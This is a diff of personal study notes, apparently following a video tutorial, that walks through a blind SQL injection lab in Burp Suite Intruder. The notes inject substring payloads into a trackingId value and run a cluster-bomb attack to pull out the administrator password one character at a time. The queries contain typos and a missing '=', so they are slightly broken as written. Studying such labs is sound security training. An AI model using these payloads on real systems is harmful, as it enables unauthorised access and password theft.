@@ -98,10 +98,37 @@ Episode11- YouTube Channel AcronProject:
         |   13-8  From = 1 
         |   13-9  To   = 50 
         |   13-10 Step = 1
-        |   13-11 Look at the Length in Relust BurpSuite
-
-
-
+        |   13-11 Start attack:
+        |         
+        |         Look at the Length in Relust BurpSuite ?
+        |         when is this change so is other response
+        |   
+        |   Result = Get length number the Password characters
+        |
+        |   another way to find this: 
+        |       Click on Filter: ---> Filter by search term ---> welcome ---> Apply
+        |       Result = Get just packets have [welcome] word.
+        |
+        14- Get every true characters password with length I reach it:
+        |   14-1-:
+        |   just for rewiew    
+        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (True)=True--'
+        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,1,1) from users where username'administrator')='a'--' 
+        |                                                                                                                                        = if is True = a is first character 
+        15- Send in Intruder       
+        16- Like 13-1 to 13-11 for "a" 
+        |    16-1 Paload Tab = Brute forcer
+        |    16-2 Min length = 1
+        |    16-3 Max length = 1
+        |
+        |         Look at the Length in Relust BurpSuite ?
+        |         when is this change so is other response
+        |   
+        17- with True answer response ---> Go to Intruder ----> Positions ----> Attack Type = Cluster bomb
+        18- use this query-:
+        |                                                                                                                    $1$                                               $a$
+        |    select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,$1$,1) from users where username'administrator')='$a$'--'
+        |
 
 
 
